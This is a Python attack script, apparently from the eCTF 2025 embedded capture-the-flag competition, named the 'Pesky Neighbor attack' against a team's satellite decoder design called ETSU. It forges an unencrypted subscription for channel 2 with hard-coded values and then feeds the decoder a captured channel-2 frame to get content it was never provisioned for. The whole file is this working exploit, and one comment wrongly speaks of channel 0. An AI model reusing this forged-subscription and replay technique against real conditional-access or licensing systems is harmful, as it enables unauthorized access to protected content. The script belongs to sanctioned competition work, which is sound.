"""Pesky Neighbor attack for ETSU
@author: Gavin Zhong, Liz Grzyb
@description: ETSU does not encrypt subscription, so we first give it a subscription for chanel 2 which it was not provisioned for,
then send lgmt channel 2 frame to it
"""

import time
import struct
import sys

# The ectf25 module comes pre-installed in the environment
from ectf25.utils.decoder import DecoderIntf

def gen_subscribe() -> bytes:
    """Gavin Zhong
        generate subscription for channel 2
    """
    sub_data = struct.pack("<IQQI", 0x4c4fcb61, 0, 5899760443365813, 2)
    lgmt_channel_2 = b'\x02\x00\x00\x00\x95\x8a\xd2\x18\x0b\xf6\x05\x00\xcd]\x10\x11S\xca\xaf\x11\xa2\x06\xbe\xfbw\x83K\x18\xdb\x0fuXj\x81\xfd\xd1\xc03\xe6\xac\x03\xb6\x16\x9dyc\x03\xb7\xa0*\xeb?;\xa6\x9c\x9d\xe7\xa0\x1a\xee\xfc\xc4\xc3\x7fM\xbd\r@\x11\x87\xa3z\x11\xd4Qv\x81\x8b?\x8e\xf4fN\x03\xde\xf9Hv_Y\xd6\xf2M\x0f\x00\x00'
    return sub_data, lgmt_channel_2


if __name__ == '__main__':
    print("Running Pesky Neighbor attack")
    time.sleep(1)
    
    # The serial port string will be in argv[1]
    interface = DecoderIntf(sys.argv[1])
    # Replay lgmt channel 0 frame
    exp = gen_subscribe()
    interface.subscribe(exp[0])
    interface.decode(exp[1])

    print("Done with pesky Neighbor attack")
